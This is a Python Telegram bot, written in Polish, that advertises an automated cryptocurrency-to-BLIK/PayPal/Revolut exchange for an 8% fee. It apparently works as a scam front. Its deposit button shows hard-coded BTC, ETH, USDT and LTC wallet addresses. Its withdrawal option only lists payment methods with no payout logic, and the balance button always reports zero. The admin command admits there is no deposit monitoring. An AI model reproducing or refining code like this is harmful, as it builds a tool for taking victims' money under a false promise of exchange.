import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackContext, CallbackQueryHandler, ContextTypes

# --- KONFIGURACJA ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 6178640111  # Wstaw swoje ID Telegram

# --- DANE STAŁE ---
crypto_wallets = {
    "Bitcoin (BTC)": "bc1qsnq04cr8mzyna6yr047g4vrl43rzfhr0ppt63y",
    "Ethereum (ETH Network)": "0x6d6F438B2c629A19816F2D07C721bD7C617981d2",
    "Tether USDT (ERC20)": "0x6d6F438B2c629A19816F2D07C721bD7C617981d2",
    "Litecoin (LTC)": "LWXm8AZ9b18gtQkGM42XPhCH1h48XED8oo"
}

withdraw_methods = [
    "Kod Blik", "Czek Blik", "Przelew bankowy", "PayPal", "Revolut", "Zen"
]

# --- FUNKCJE ---

async def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("📥 Wpłać krypto", callback_data='deposit')],
        [InlineKeyboardButton("📤 Wypłać środki", callback_data='withdraw')],
        [InlineKeyboardButton("💰 Sprawdź saldo", callback_data='balance')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    photo_url = "https://imgur.com/a/xBGaXs7.jpg"  # <- tu możesz zmienić grafikę

    await update.message.reply_photo(
        photo=photo_url,
        caption=(
            "<b>🤖 WITAMY W AUTOMATYCZNYM KANTORZE KRYPTOWALUT!</b>\n\n"
            "💸 Wymieniaj <b>Bitcoin, USDT, ETH, Litecoin</b>\n"
            "➡️ Na <b>Kod Blik, PayPal, Revolut, Zen, Przelew Bankowy</b>\n\n"
            "✂️ Pobieramy tylko <b>8%</b> niezależnie od kwoty!\n\n"
            "• <b>min. 150 PLN</b>\n"
            "• <b>max. 50 000 PLN</b>\n"

            "⏰ Działamy 24/7 – bez przerwy.\n\n"
            "👇 Wybierz opcję:"
        ),
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'deposit':
        text = "<b>🔐 Wybierz kryptowalutę do wpłaty:</b>\n\n"
        for name, address in crypto_wallets.items():
            text += f"• <b>{name}</b>\n<code>{address}</code>\n\n"
        await query.message.reply_text(text, parse_mode="HTML")

    elif query.data == 'withdraw':
        text = "<b>💸 Wypłata dostępna przez:</b>\n\n" + "\n".join([f"• {m}" for m in withdraw_methods])
        await query.message.reply_text(text, parse_mode="HTML")

    elif query.data == 'balance':
        await query.message.reply_text("<b>💰 Twoje saldo:</b>\n0.00 PLN", parse_mode="HTML")

async def check_admin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("⛔ Brak dostępu.")
    await update.message.reply_text("🛡️ Panel admina — brak automatycznego monitoringu. Sprawdź saldo ręcznie.")

# --- START ---
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check_admin", check_admin))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 Bot działa...")
    app.run_polling()
